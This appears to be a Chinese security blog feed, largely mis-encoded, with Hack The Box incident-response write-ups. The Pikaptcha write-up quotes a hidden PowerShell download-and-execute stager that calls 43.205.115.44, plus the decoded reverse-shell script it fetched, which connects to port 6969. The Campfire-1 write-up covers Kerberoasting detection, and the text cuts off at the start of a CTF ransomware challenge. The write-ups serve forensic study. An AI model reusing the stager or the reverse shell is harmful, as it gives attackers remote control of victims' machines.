href="#åˆ†æç”¨æˆ·-happy-grunwald-çš„æ³¨å†Œè¡¨é…ç½®å•å…ƒï¼ŒæŸ¥æ‰¾å…¶ä¸‹è½½å¹¶æ‰§è¡Œ-stager-çš„å®Œæ•´å‘½ä»¤" class="headerlink" title="åˆ†æç”¨æˆ· happy grunwald çš„æ³¨å†Œè¡¨é…ç½®å•å…ƒï¼ŒæŸ¥æ‰¾å…¶ä¸‹è½½å¹¶æ‰§è¡Œ stager çš„å®Œæ•´å‘½ä»¤"></a>åˆ†æç”¨æˆ· happy grunwald çš„æ³¨å†Œè¡¨é…ç½®å•å…ƒï¼ŒæŸ¥æ‰¾å…¶ä¸‹è½½å¹¶æ‰§è¡Œ stager çš„å®Œæ•´å‘½ä»¤</h1><p>tree ä¸€ä¸‹å‘ç°æ–‡ä»¶ä¸­æœ‰å¤šä¸ªç”¨æˆ·ï¼ˆå®é™…ä¸Šä¹Ÿåªç”¨äº†ä¸€ä¸ªï¼‰</p><p><img src="https://img.dkdun.cn/v1/2025/12/d79abedada005e31.png"></p><p>ç”¨ <a href="https://ericzimmerman.github.io/#!index.md">Registry Explorer</a> æ‰“å¼€ <code>Pikaptcha\2024-09-23T052209_alert_mssp_action\C\Users\happy.grunwald</code> ä¸‹çš„ <code>NTUSER.DAT</code> æ–‡ä»¶ï¼Œè®¿é—® <code>RunMRU</code> æ–‡ä»¶å¤¹ï¼Œæ‰¾åˆ°å‘½ä»¤</p><p><img src="https://img.dkdun.cn/v1/2025/12/973c45ff742acec1.png"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">powershell -NoP -NonI -W Hidden -Exec Bypass -Command &quot;IEX(New-Object <span class="hljs-built_in">Net</span>.WebClient).DownloadString(&#x27;http://<span class="hljs-number">43</span>.<span class="hljs-number">205</span>.<span class="hljs-number">115</span>.<span class="hljs-number">44</span>/office2024install.ps1&#x27;)&quot;<br></code></pre></td></tr></table></figure><ul><li>NoPï¼šNoProfileï¼Œä¸åŠ è½½ PowerShell é…ç½®æ–‡ä»¶ï¼Œå¿«é€Ÿå¯åŠ¨</li><li>NonIï¼šNonlnteractiveï¼Œéäº¤äº’æ¨¡å¼</li><li>W Hiddenï¼šWindowStyle Hiddenï¼Œéšè— PowerShell çª—å£ï¼Œè®©ç”¨æˆ·æ— æ³•å¯Ÿè§‰ç¨‹åºè¿è¡Œ</li><li>Exec Bypassï¼šExecutionPolicy Bypassï¼Œç»•è¿‡ç³»ç»Ÿè„šæœ¬æ‰§è¡Œç­–ç•¥</li><li>Commandä¸­çš„ <code>IRX</code>ï¼šInvoke-Expressionï¼Œç›´æ¥æ‰§è¡Œä¸‹è½½çš„è„šæœ¬</li></ul><p>æ•´ä¸ªå‘½ä»¤çš„ä½œç”¨å°±æ˜¯ï¼šä¸‹è½½æ¥è‡ª IP <code>43.205.115.44</code> çš„ <code>office2024install.ps1</code> è„šæœ¬ï¼Œä½†ä¸‹è½½å’Œæ‰§è¡Œéƒ½è¢«éšè—äº†</p><h1 id="payload-æ‰§è¡Œçš„-UTC-æ—¶é—´"><a href="#payload-æ‰§è¡Œçš„-UTC-æ—¶é—´" class="headerlink" title="payload æ‰§è¡Œçš„ UTC æ—¶é—´"></a>payload æ‰§è¡Œçš„ UTC æ—¶é—´</h1><p><img src="https://img.dkdun.cn/v1/2025/12/5e7f37e89844e2e7.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2024</span>-<span class="hljs-number">09</span>-<span class="hljs-number">23</span> <span class="hljs-number">05</span>:<span class="hljs-number">07</span>:<span class="hljs-number">45</span><br></code></pre></td></tr></table></figure><h1 id="æ‰¾å‡ºè¯¥è„šæœ¬çš„-SHA256-å“ˆå¸Œå€¼"><a href="#æ‰¾å‡ºè¯¥è„šæœ¬çš„-SHA256-å“ˆå¸Œå€¼" class="headerlink" title="æ‰¾å‡ºè¯¥è„šæœ¬çš„ SHA256 å“ˆå¸Œå€¼"></a>æ‰¾å‡ºè¯¥è„šæœ¬çš„ SHA256 å“ˆå¸Œå€¼</h1><p> åŠ è½½æµé‡åŒ…ï¼Œå¯¼å‡ºå…³äº <code>office2024install.ps1</code> çš„æ–‡ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/e8829d2cb860f285.png"></p><p>è·å– hash å€¼</p><p><img src="https://img.dkdun.cn/v1/2025/12/45f2d3e3d99ce3f3.png"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">579284442094e1</span>a<span class="hljs-number">44</span>bea<span class="hljs-number">9</span>cfb<span class="hljs-number">7</span>d<span class="hljs-number">8</span>d<span class="hljs-number">794</span><span class="hljs-keyword">c</span><span class="hljs-number">8977714</span>f<span class="hljs-number">827</span><span class="hljs-keyword">c</span><span class="hljs-number">97</span>bcb<span class="hljs-number">2822</span>a<span class="hljs-number">97742914</span>de<br></code></pre></td></tr></table></figure><h1 id="åå‘-shell-è¿æ¥çš„ç«¯å£"><a href="#åå‘-shell-è¿æ¥çš„ç«¯å£" class="headerlink" title="åå‘ shell è¿æ¥çš„ç«¯å£"></a>åå‘ shell è¿æ¥çš„ç«¯å£</h1><p>æŠŠ <code>office2024install.ps1</code> æ–‡ä»¶å†…å®¹è§£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">$client = New - Object System.Net.Sockets.TCPClient(<span class="hljs-string">&quot;43.205.115.44&quot;</span>, <span class="hljs-number">6969</span>);<br>$stream = $client.GetStream(); [<span class="hljs-type">byte</span>[]] $bytes = <span class="hljs-number">0.</span><span class="hljs-number">.65535</span> | %&#123;<br>    <span class="hljs-number">0</span><br>&#125;;<br><span class="hljs-keyword">while</span> (($i = $stream.Read($bytes, <span class="hljs-number">0</span>, $bytes.Length)) - ne <span class="hljs-number">0</span>) &#123;;<br>    $data = (New - Object - TypeName System.Text.ASCIIEncoding).GetString($bytes, <span class="hljs-number">0</span>, $i);<br>    $sendback = (iex $data <span class="hljs-number">2</span> &gt; &amp;<span class="hljs-number">1</span> | Out - String);<br>    $sendback2 = $sendback + <span class="hljs-string">&quot;PS &quot;</span> + (pwd).Path + <span class="hljs-string">&quot;&gt; &quot;</span>;<br>    $sendbyte = ([text.encoding] : :ASCII).GetBytes($sendback2);<br>    $stream.Write($sendbyte, <span class="hljs-number">0</span>, $sendbyte.Length);<br>    $stream.Flush()<br>&#125;;<br>$client.Close()<br></code></pre></td></tr></table></figure><p>ä»ä¸­å¯ä»¥çœ‹å‡ºç«¯å£æ˜¯ 6969</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-number">6969</span><br></code></pre></td></tr></table></figure><h1 id="C2-å’Œå·¥ä½œç«™ä¹‹é—´çš„åå‘-shell-è¿æ¥å»ºç«‹æŒç»­æ—¶é—´"><a href="#C2-å’Œå·¥ä½œç«™ä¹‹é—´çš„åå‘-shell-è¿æ¥å»ºç«‹æŒç»­æ—¶é—´" class="headerlink" title="C2 å’Œå·¥ä½œç«™ä¹‹é—´çš„åå‘ shell è¿æ¥å»ºç«‹æŒç»­æ—¶é—´"></a>C2 å’Œå·¥ä½œç«™ä¹‹é—´çš„åå‘ shell è¿æ¥å»ºç«‹æŒç»­æ—¶é—´</h1><p>å› ä¸ºå‰é¢å·²ç»æ‰¾åˆ°åå‘ shell çš„ç«¯å£å·äº†ï¼Œæ‰€ä»¥ç›´æ¥è¿‡æ»¤å°±è¡Œ</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">tcp.port<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">6969</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/1c4ba07cdcd823a4.png"></p><p>æ ¹æ®è¯¦ç»†åˆ¤æ–­å¼€å§‹å’Œç»“æŸæ—¶é—´ï¼Œç„¶åç›´æ¥ç›¸å‡å¾—åˆ° 403 s</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">403<br></code></pre></td></tr></table></figure><h1 id="åŒ…å«-payload-çš„å‡½æ•°åç§°"><a href="#åŒ…å«-payload-çš„å‡½æ•°åç§°" class="headerlink" title="åŒ…å« payload çš„å‡½æ•°åç§°"></a>åŒ…å« payload çš„å‡½æ•°åç§°</h1><p>è¿‡æ»¤ IP å’Œç«¯å£ï¼Œè¿½è¸ª TCP æµå‘ç°ä¸‹è½½ <code>BloodHound</code> æ‰§è¡Œäº† <code>SharpHound.ps1</code> æ–‡ä»¶è¾“å‡ºåˆ° Windows çš„ tmp ç›®å½•</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ip.<span class="hljs-attribute">addr</span>==43.205.115.44 &amp;&amp; tcp.<span class="hljs-attribute">port</span>==6969<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/8b808ac416206d10.png"></p><p>è¿™æ˜¯ä¸€ä¸ªèƒ½æ˜ å°„å’Œé‡åŒ– Active Directory æ”»å‡»è·¯å¾„çš„å·¥å…·ï¼Œä½†æ˜¯åœ¨æ­¤å¹¶æ²¡æœ‰ä»€ä¹ˆå±å®³</p><p>è¿‡æ»¤ http æ•°æ®åŒ…</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">http&amp;&amp;ip.<span class="hljs-attribute">addr</span>==43.205.115.44<br></code></pre></td></tr></table></figure><p>è¿½è¸ª HTTP æµï¼Œå‘ç° <code>stageClipboard()</code> å‡½æ•°åŒ…å«äº† payload å‘½ä»¤</p><p><img src="https://img.dkdun.cn/v1/2025/12/51eb1e7f381ba720.png"></p><p>æ‰€ä»¥ä¸º</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">stageClipboard</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>åº”æ€¥å“åº”&amp;å–è¯</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>åº”æ€¥å“åº”</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Campfire-1</title>
    <link href="/2025/04/11/HTB-Campfire-1/"/>
    <url>/2025/04/11/HTB-Campfire-1/</url>
    
    <content type="html"><![CDATA[<p> æ¥è‡ª DC çš„å®‰å…¨æ—¥å¿—ï¼Œå—å½±å“çš„ WorkStation çš„ PowerShell æ“ä½œæ—¥å¿—å’Œ Prefetch æ–‡ä»¶</p><span id="more"></span><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Alonzo Spotted Weird files on his computer and informed the newly assembled SOC Team. Assessing the situation it is believed a Kerberoasting attack may have occurred in the network. It is your job to confirm the findings by analyzing the provided evidence. You are provided with: 1- Security Logs from the Domain Controller 2- PowerShell-Operational Logs from the affected workstation 3- Prefetch Files from the affected workstation</p><h1 id="åˆ†æ-DC-çš„å®‰å…¨æ—¥å¿—ç¡®è®¤-Kerberoasting-æ´»åŠ¨å‘ç”Ÿçš„æ—¥æœŸå’Œæ—¶é—´"><a href="#åˆ†æ-DC-çš„å®‰å…¨æ—¥å¿—ç¡®è®¤-Kerberoasting-æ´»åŠ¨å‘ç”Ÿçš„æ—¥æœŸå’Œæ—¶é—´" class="headerlink" title="åˆ†æ DC çš„å®‰å…¨æ—¥å¿—ç¡®è®¤ Kerberoasting æ´»åŠ¨å‘ç”Ÿçš„æ—¥æœŸå’Œæ—¶é—´"></a>åˆ†æ DC çš„å®‰å…¨æ—¥å¿—ç¡®è®¤ Kerberoasting æ´»åŠ¨å‘ç”Ÿçš„æ—¥æœŸå’Œæ—¶é—´</h1><h2 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h2><p>å…ˆç®€å•å­¦ä¹ ä¸€ä¸‹å…³äº Kerberos çš„çŸ¥è¯†</p><p>Kerberos æ˜¯ä¸€ç§è®¡ç®—æœºç½‘ç»œè®¤è¯åè®®ï¼Œä½œç”¨æ˜¯è¿›è¡Œèº«ä»½éªŒè¯</p><h3 id="èº«ä»½éªŒè¯è¿‡ç¨‹"><a href="#èº«ä»½éªŒè¯è¿‡ç¨‹" class="headerlink" title="èº«ä»½éªŒè¯è¿‡ç¨‹"></a>èº«ä»½éªŒè¯è¿‡ç¨‹</h3><ul><li>å®¢æˆ·ç«¯å‘ KDCï¼ˆKey Distribution Centerï¼Œé€šå¸¸æ˜¯åŸŸæ§åˆ¶å™¨ï¼‰è¯·æ±‚ TGTï¼ˆTicket Granting Ticketï¼‰ï¼Œè¯·æ±‚ç”¨æˆ·çš„å¯†é’¥ä¹‹ä¸€ç”¨äºé¢„èº«ä»½éªŒè¯ã€‚TGT ç”±èº«ä»½éªŒè¯æœåŠ¡ (AS) æä¾›ï¼Œå®¢æˆ·ç«¯çš„è¯·æ±‚è¢«ç§°ä¸ºAS-REQï¼Œåº”ç­”è¢«ç§°ä¸ºAS-REPã€‚</li><li>å®¢æˆ·ç«¯ä½¿ç”¨ TGT å‘ KDC è¯·æ±‚ STï¼ˆæœåŠ¡ç¥¨è¯ï¼‰ã€‚è¯¥ç¥¨è¯ç”±ç¥¨è¯æˆäºˆæœåŠ¡ (TGS) æä¾›ã€‚å®¢æˆ·ç«¯çš„è¯·æ±‚è¢«ç§°ä¸º TGS-REQï¼Œåº”ç­”è¢«ç§°ä¸º TGS-REPã€‚</li><li>å®¢æˆ·ç«¯ä½¿ç”¨ STï¼ˆæœåŠ¡ç¥¨è¯ï¼‰æ¥è®¿é—®æœåŠ¡ã€‚å®¢æˆ·ç«¯å¯¹æœåŠ¡çš„è¯·æ±‚è¢«ç§°ä¸ºè°ƒç”¨ AP-REQï¼ŒæœåŠ¡çš„å“åº”è¢«ç§°ä¸ºè°ƒç”¨ AP-REPã€‚</li><li>ä¸¤ç§ç¥¨è¯ï¼ˆTGT å’Œ STï¼‰é€šå¸¸éƒ½åŒ…å«åŠ å¯†çš„ PACï¼ˆç‰¹æƒèº«ä»½éªŒè¯è¯ä¹¦ï¼‰ï¼Œç›®æ ‡æœåŠ¡å°†è¯»å–ä¸€ç»„ä¿¡æ¯æ¥å†³å®šèº«ä»½éªŒè¯ç”¨æˆ·æ˜¯å¦å¯ä»¥è®¿é—®è¯¥æœåŠ¡ï¼ˆç”¨æˆ· IDã€ç»„æˆå‘˜èº«ä»½ç­‰ï¼‰ã€‚</li></ul><h2 id="prefetch"><a href="#prefetch" class="headerlink" title="prefetch"></a>prefetch</h2><p>Windows ä¸­çš„é¢„è¯»å–æ–‡ä»¶å¤¹ï¼Œå­˜æ”¾ç³»ç»Ÿå·²è®¿é—®çš„æ–‡ä»¶çš„é¢„è¯»ä¿¡æ¯ï¼Œç¨‹åºé¦–æ¬¡è¿è¡Œæ—¶ä¼šå­˜å‚¨æœ‰å…³åœ¨åŠ è½½è¯¥æ–‡ä»¶æ—¶è®¿é—®çš„æ‰€æœ‰æ–‡ä»¶çš„ä¿¡æ¯ï¼Œè¿˜å­˜å‚¨å…ƒæ•°æ®ã€‚</p><h2 id="kerberoasting-æ”»å‡»"><a href="#kerberoasting-æ”»å‡»" class="headerlink" title="kerberoasting æ”»å‡»"></a>kerberoasting æ”»å‡»</h2><p>kerberoasting æ”»å‡»æ˜¯åœ¨ TGS_REP è¿‡ç¨‹ä¸­ç”¨æˆ·ä¼šæ”¶åˆ°ç”±ç›®æ ‡æœåŠ¡å®ä¾‹çš„ NTLM hash åŠ å¯†çš„ TGSï¼Œå¦‚æœå¾—åˆ°äº†è¿™ä¸ª TGSï¼Œç”±äºè¯¥ TGS æ˜¯ç”¨æœåŠ¡ç«¯ hash åŠ å¯†ï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯æ‹¿åˆ° TGS åå¯ä»¥æœ¬åœ°çˆ†ç ´ï¼Œå¦‚æœå­—å…¸è¶³å¤Ÿå¤§åˆ™èƒ½çˆ†ç ´å‡º SPNï¼ˆæœåŠ¡ä¸»ä½“åç§°ï¼‰ é“¾æ¥ç”¨æˆ·çš„æ˜æ–‡å¯†ç ï¼Œå½“è¯¥æœåŠ¡åœ¨åŸŸå†…æƒé™å¾ˆé«˜æ—¶ï¼Œæ”»å‡»è€…èƒ½æ¥ç®¡æ•´ä¸ªåŸŸã€‚</p><h2 id="åˆ†æ-DC-çš„å®‰å…¨æ—¥å¿—ï¼Œç¡®è®¤-Kerberoasting-æ´»åŠ¨å‘ç”Ÿçš„æ—¥æœŸå’Œæ—¶é—´"><a href="#åˆ†æ-DC-çš„å®‰å…¨æ—¥å¿—ï¼Œç¡®è®¤-Kerberoasting-æ´»åŠ¨å‘ç”Ÿçš„æ—¥æœŸå’Œæ—¶é—´" class="headerlink" title="åˆ†æ DC çš„å®‰å…¨æ—¥å¿—ï¼Œç¡®è®¤ Kerberoasting æ´»åŠ¨å‘ç”Ÿçš„æ—¥æœŸå’Œæ—¶é—´"></a>åˆ†æ DC çš„å®‰å…¨æ—¥å¿—ï¼Œç¡®è®¤ Kerberoasting æ´»åŠ¨å‘ç”Ÿçš„æ—¥æœŸå’Œæ—¶é—´</h2><p>æŸ¥çœ‹ <code>Domain Controller</code> ä¸­çš„å®‰å…¨æ—¥å¿—ï¼Œæ ¹æ® kerberoasting åŸç†æŸ¥çœ‹ TGS ç›¸å…³æ—¥å¿—ï¼Œç­›é€‰äº‹ä»¶ ID 4769ï¼ŒæŸ¥æ‰¾æœåŠ¡åç§°ä¸ä¸º <code>krbtgt</code> æˆ–ä»¥ <code>$</code> ç»“å°¾ï¼ˆæ¯”å¦‚ DC01$ ï¼‰çš„ä»»ä½•äº‹ä»¶ã€‚ç¥¨è¯åŠ å¯†ç±»å‹ä¸º <code>0x17</code>ï¼Œç”¨äº RC4 ç±»å‹åŠ å¯†ï¼Œæ•…éšœä»£ç ä¸º 0x0</p><p><img src="https://img.dkdun.cn/v1/2025/12/0f7e4ec4280961ce.png"></p><p>æ—¶é—´è½¬æ¢æˆ UTC</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">21</span> <span class="hljs-number">11</span>:<span class="hljs-number">18</span>:<span class="hljs-number">09</span> -&gt; <span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">21</span> <span class="hljs-number">03</span>:<span class="hljs-number">18</span>:<span class="hljs-number">09</span><br></code></pre></td></tr></table></figure><h1 id="æŸ¥æ‰¾ç›®æ ‡æœåŠ¡åç§°"><a href="#æŸ¥æ‰¾ç›®æ ‡æœåŠ¡åç§°" class="headerlink" title="æŸ¥æ‰¾ç›®æ ‡æœåŠ¡åç§°"></a>æŸ¥æ‰¾ç›®æ ‡æœåŠ¡åç§°</h1><p>ç›®æ ‡æœåŠ¡åœ¨å‰é¢æ‰¾åˆ°çš„äº‹ä»¶ä¸­èƒ½å‘ç°åå­—ä¸º <code>MSSQLService</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/3f6860db245f91d4.png"></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">MSSQLService</span><br></code></pre></td></tr></table></figure><h1 id="å·¥ä½œç«™çš„-IP-åœ°å€"><a href="#å·¥ä½œç«™çš„-IP-åœ°å€" class="headerlink" title="å·¥ä½œç«™çš„ IP åœ°å€"></a>å·¥ä½œç«™çš„ IP åœ°å€</h1><p>æŸ¥æ‰¾ IP</p><p><img src="https://img.dkdun.cn/v1/2025/12/263f08631dacbce1.png"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.17.79.129</span><br></code></pre></td></tr></table></figure><h1 id="æŸ¥æ‰¾ç”¨äºæšä¸¾-AD-å¯¹è±¡å¹¶å¯èƒ½åœ¨ç½‘ç»œä¸­æŸ¥æ‰¾-Kerberoastable-å¸æˆ·çš„æ–‡ä»¶åç§°"><a href="#æŸ¥æ‰¾ç”¨äºæšä¸¾-AD-å¯¹è±¡å¹¶å¯èƒ½åœ¨ç½‘ç»œä¸­æŸ¥æ‰¾-Kerberoastable-å¸æˆ·çš„æ–‡ä»¶åç§°" class="headerlink" title="æŸ¥æ‰¾ç”¨äºæšä¸¾ AD å¯¹è±¡å¹¶å¯èƒ½åœ¨ç½‘ç»œä¸­æŸ¥æ‰¾ Kerberoastable å¸æˆ·çš„æ–‡ä»¶åç§°"></a>æŸ¥æ‰¾ç”¨äºæšä¸¾ AD å¯¹è±¡å¹¶å¯èƒ½åœ¨ç½‘ç»œä¸­æŸ¥æ‰¾ Kerberoastable å¸æˆ·çš„æ–‡ä»¶åç§°</h1><p>æŸ¥çœ‹ <code>Workstation</code> ä¸­çš„ <code>Powershell-Operational.evtx</code>ï¼Œå¯ä»¥å‘ç° ID ä¸º 4104 çš„äº‹ä»¶æ‰§è¡Œçš„å…¨æ˜¯è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</p><p><img src="https://img.dkdun.cn/v1/2025/12/d06951d0735d922a.png"></p><p>ç”¨ <a href="https://ericzimmerman.github.io/#!index.md">EvtxECmd</a> å°† <code>.evtx</code> æ–‡ä»¶è½¬åŒ–ä¸º <code>.csv</code> æ–‡ä»¶ï¼Œä¸¢å…¥ Timeline Explorer ç­›é€‰ ID&#x3D;4104</p><p><img src="https://img.dkdun.cn/v1/2025/12/31ac189108678fec.png"></p><p>å¯ä»¥å‘ç°å…¨æ˜¯æ‰§è¡Œçš„ <code>C:\Users\alonzo.spire\Downloads</code> ä¸‹çš„ <code>powerview.ps1</code> </p><p>PowerView æ˜¯åŸºäº PowerShell çš„åŸŸæ¸—é€ä¿¡æ¯æ”¶é›†è„šæœ¬ï¼Œå±äº <a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a> æ¡†æ¶å’Œ Empire çš„ä¸€éƒ¨åˆ†</p><p>å¯¹æ—¶é—´æ’åºï¼Œå¯ä»¥çœ‹åˆ°é¦–æ¬¡ ID&#x3D;4104 çš„äº‹ä»¶å†…å®¹ï¼Œå¼€å§‹æ‰§è¡Œ <code>PowerSploit File</code> çš„ <code>PowerView.ps1</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/309b463038d814d3.png"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">PowerView.ps1<br></code></pre></td></tr></table></figure><h1 id="è„šæœ¬å¼€å§‹æ‰§è¡Œæ—¶é—´"><a href="#è„šæœ¬å¼€å§‹æ‰§è¡Œæ—¶é—´" class="headerlink" title="è„šæœ¬å¼€å§‹æ‰§è¡Œæ—¶é—´"></a>è„šæœ¬å¼€å§‹æ‰§è¡Œæ—¶é—´</h1><p>æ—¶é—´ä¸º <code>2024/5/21 11:16:32</code> è½¬æ¢ä¸º UTC</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">21</span> <span class="hljs-number">03</span>:<span class="hljs-number">16</span>:<span class="hljs-number">32</span><br></code></pre></td></tr></table></figure><h1 id="æŸ¥æ‰¾æ‰§è¡Œ-kerberoasting-æ”»å‡»æ‰€ç”¨çš„å·¥å…·çš„è·¯å¾„"><a href="#æŸ¥æ‰¾æ‰§è¡Œ-kerberoasting-æ”»å‡»æ‰€ç”¨çš„å·¥å…·çš„è·¯å¾„" class="headerlink" title="æŸ¥æ‰¾æ‰§è¡Œ kerberoasting æ”»å‡»æ‰€ç”¨çš„å·¥å…·çš„è·¯å¾„"></a>æŸ¥æ‰¾æ‰§è¡Œ kerberoasting æ”»å‡»æ‰€ç”¨çš„å·¥å…·çš„è·¯å¾„</h1><p>ç”¨ <a href="https://ericzimmerman.github.io/#!index.md">PECmd</a> å°† <code>prefetch</code> æ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶è½¬åŒ–æˆ <code>.csv</code> è¾“å‡ºæŸ¥çœ‹</p><p>æŸ¥çœ‹è¾“å‡ºçš„ <code>20250411131502_PECmd_Output_Timeline.csv</code> æ–‡ä»¶ï¼Œå®ƒè®°å½•äº†ç¨‹åºè¿è¡Œçš„æ—¶é—´</p><p>é€šè¿‡è„šæœ¬æ‰§è¡Œçš„å¼€å§‹æ—¶é—´ <code>2024-05-21 03:16:32</code> ç¡®å®šæŸ¥æ‰¾èŒƒå›´ï¼Œå‘ç°è¿è¡Œäº† <code>DOWNLOADS</code> è·¯å¾„ä¸‹çš„ä¸€ä¸ª <code>RUBEUS.EXE</code> </p><p><img src="https://img.dkdun.cn/v1/2025/12/cedebdfa1d18fa1f.png"></p><p>Rubeus æ˜¯ä¸€ä¸ªé’ˆå¯¹ Kerberos åè®®è¿›è¡Œæ”»å‡»çš„å·¥å…·ï¼Œæ‰€ä»¥è·¯å¾„ä¸º</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\USERS\ALONZO.SPIRE\DOWNLOADS\RUBEUS.EXE<br></code></pre></td></tr></table></figure><h1 id="æŸ¥æ‰¾æ”»å‡»å·¥å…·é¦–æ¬¡æ‰§è¡Œæ—¶é—´"><a href="#æŸ¥æ‰¾æ”»å‡»å·¥å…·é¦–æ¬¡æ‰§è¡Œæ—¶é—´" class="headerlink" title="æŸ¥æ‰¾æ”»å‡»å·¥å…·é¦–æ¬¡æ‰§è¡Œæ—¶é—´"></a>æŸ¥æ‰¾æ”»å‡»å·¥å…·é¦–æ¬¡æ‰§è¡Œæ—¶é—´</h1><p>æŸ¥çœ‹ <code>20250411131502_PECmd_Output.csv</code> æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«äº†ç¨‹åºè¿è¡Œçš„èµ·æ­¢æ—¶é—´ï¼Œè¿è¡Œæ¬¡æ•°ç­‰ç­‰</p><p>ç›´æ¥è¿‡æ»¤å‡ºä¸ <code>RUBEUS.EXE</code> æœ‰å…³çš„ä¿¡æ¯</p><p><img src="https://img.dkdun.cn/v1/2025/12/ab59c5c5ffce9d25.png"></p><p>æ‰€ä»¥æ—¶é—´ä¸º Last Run çš„æ—¶é—´</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">21</span> <span class="hljs-number">03</span>:<span class="hljs-number">18</span>:<span class="hljs-number">08</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>åº”æ€¥å“åº”&amp;å–è¯</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Kerberos</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XYCTF 2025</title>
    <link href="/2025/04/08/XYCTF-2025/"/>
    <url>/2025/04/08/XYCTF-2025/</url>
    
    <content type="html"><![CDATA[<p>å®åŠ›ä¸è¡Œ</p><span id="more"></span><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="å‹’ç´¢ç—…æ¯’"><a href="#å‹’ç´¢ç—…æ¯’" class="headerlink" title="å‹’ç´¢ç—…æ¯’"></a>å‹’ç´¢ç—…æ¯’</h2><p>ï¼ˆæ„Ÿè§‰è¿™é¢˜æœ‰ç‚¹è¯¥æ”¾é€†å‘é‡Œé¢çš„ï¼‰</p><p>æœ‰ä¸€ä¸ª task.exeï¼ŒEP æŸ¥ä¸€ä¸‹å‘ç°æ˜¯ Pyinstaller æ‰“åŒ…çš„ python æ–‡ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/907f2517c3fa05b9.png"></p><p>ç”¨ <code>pyinstxtractor</code> è§£åŒ…</p><p><img src="https://img.dkdun.cn/v1/2025/12/810d3c5362cfc48c.png"></p><p>ç”¨ <a href="https://pylingual.io/">https://pylingual.io</a> è¿›è¡Œåç¼–è¯‘ï¼Œåç¼–è¯‘ç»“æœå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 